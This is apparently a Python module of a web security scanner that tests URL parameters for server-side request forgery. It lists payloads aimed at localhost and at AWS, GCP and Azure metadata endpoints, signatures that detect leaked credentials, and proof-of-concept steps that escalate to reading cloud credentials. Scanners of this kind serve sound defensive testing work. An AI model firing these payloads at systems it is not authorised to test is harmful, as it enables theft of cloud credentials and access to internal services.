"""SSRF Scanner"""
from __future__ import annotations
import asyncio, re
from typing import List
from core.base_scanner import BaseScanner
from core.models import Finding, ScanState
from config.settings import Severity

SSRF_PAYLOADS = [
    "http://127.0.0.1/", "http://localhost/", "http://0.0.0.0/",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance",
    "http://0x7f000001/", "http://2130706433/", "http://127.1/",
]

SSRF_URL_PARAMS = ["url","uri","path","src","source","dest","destination",
    "redirect","next","data","reference","site","html","callback","return",
    "view","image","img","load","fetch","request","feed","host","proxy"]

INTERNAL_SIGS = [r"root:x:0:0", r"SSH-\d", r"redis_version",
    r"AMI ID", r"instance-id", r"computeMetadata", r"iam/security-credentials"]

CLOUD_METADATA_MARKERS = ["169.254", "metadata.google.internal", "metadata.azure",
                          "100.100.100.200"]

class SSRFScanner(BaseScanner):
    name = "ssrf"
    description = "Detects SSRF including cloud metadata access"
    tags = ["ssrf", "owasp-a10"]

    @staticmethod
    def _is_cloud_payload(payload: str) -> bool:
        return any(marker in payload for marker in CLOUD_METADATA_MARKERS)

    async def run(self, state: ScanState) -> List[Finding]:
        # Filter cloud-metadata payloads when policy forbids
        filter_cloud = state.target.metadata.get("filter_cloud_payloads", False)
        active_payloads = [
            p for p in SSRF_PAYLOADS
            if not (filter_cloud and self._is_cloud_payload(p))
        ]
        if filter_cloud:
            self.logger.info("Cloud-metadata payloads filtered by policy")

        tasks = []
        for url, params in state.target.discovered_params.items():
            for param in params:
                for payload in active_payloads:
                    if param.lower() in SSRF_URL_PARAMS or "169.254" in payload:
                        tasks.append(self._test(url, param, payload))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return [r for r in results if isinstance(r, Finding)]

    async def _test(self, url, param, payload):
        resp, raw_req = await self.test_payload(url, "GET", param, payload, inject_in="query")
        if resp is None: return None
        for sig in INTERNAL_SIGS:
            m = re.search(sig, resp.text, re.IGNORECASE)
            if m:
                is_cloud = "169.254" in payload or "metadata" in payload
                return self.make_finding(
                    title=f"{'Cloud Metadata' if is_cloud else 'Internal'} SSRF via '{param}'",
                    vuln_type="ssrf_cloud_metadata" if is_cloud else "ssrf",
                    severity=Severity.CRITICAL if is_cloud else Severity.HIGH,
                    url=url, parameter=param, payload=payload,
                    evidence=f"Internal signature: {m.group(0)}",
                    request=raw_req, response=resp.text[:500],
                    cwe_id="CWE-918", owasp_category="A10:2021 - SSRF",
                    description=f"Parameter '{param}' performs SSRF. Payload: {payload}",
                    poc_steps=[
                        f"1. Set '{param}' to {payload}",
                        f"2. Server fetches the internal/cloud resource",
                        f"3. Response contains internal signature: {m.group(0)}",
                        "4. Escalate: read cloud credentials, access internal services",
                    ],
                )
        return None
